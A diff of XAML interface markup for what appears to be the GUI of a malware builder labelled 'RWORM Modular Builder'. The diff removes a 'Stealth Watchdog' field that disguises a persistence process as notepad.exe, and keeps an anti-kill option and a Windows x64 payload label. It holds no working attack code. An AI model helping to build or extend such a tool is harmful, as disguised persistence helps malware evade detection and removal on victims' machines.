@@ -438,25 +438,7 @@
                                     <TextBlock Grid.Column="1" Text="{Binding BuildAntiKill, StringFormat='Active: {0}'}" Foreground="#0F172A" FontWeight="SemiBold"/>
                                 </Grid>
 
-                                <Grid Margin="0,0,0,8">
-                                    <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
-                                    <TextBlock Text="Watchdog Process:" Foreground="#64748B"/>
-                                    <TextBlock Grid.Column="1">
-                                        <TextBlock.Style>
-                                            <Style TargetType="TextBlock">
-                                                <Setter Property="Text" Value="None (Disabled)"/>
-                                                <Setter Property="Foreground" Value="#64748B"/>
-                                                <Style.Triggers>
-                                                    <DataTrigger Binding="{Binding BuildAntiKill}" Value="True">
-                                                        <Setter Property="Text" Value="notepad.exe (Stealth Watchdog)"/>
-                                                        <Setter Property="Foreground" Value="#10B981"/>
-                                                        <Setter Property="FontWeight" Value="Bold"/>
-                                                    </DataTrigger>
-                                                </Style.Triggers>
-                                            </Style>
-                                        </TextBlock.Style>
-                                    </TextBlock>
-                                </Grid>
+                                
 
                                 <Grid Margin="0,0,0,8">
                                     <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
@@ -529,10 +511,7 @@
         <!-- Status Bar -->
         <Border Grid.Row="2" Background="#FFFFFF" BorderBrush="#E2E8F0" BorderThickness="0,1,0,0">
             <Grid Margin="18,0">
-                <StackPanel Orientation="Horizontal" HorizontalAlignment="Left" VerticalAlignment="Center">
-                    <Ellipse Width="8" Height="8" Fill="#10B981" Margin="0,0,8,0"/>
-                    <TextBlock Text="Ready — RWORM Modular Builder" FontSize="12" Foreground="#64748B"/>
-                </StackPanel>
+                
                 <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
                     <TextBlock Text="Payload: Windows x64 (~11 MB)" FontSize="12" Foreground="#64748B"/>
                 </StackPanel>
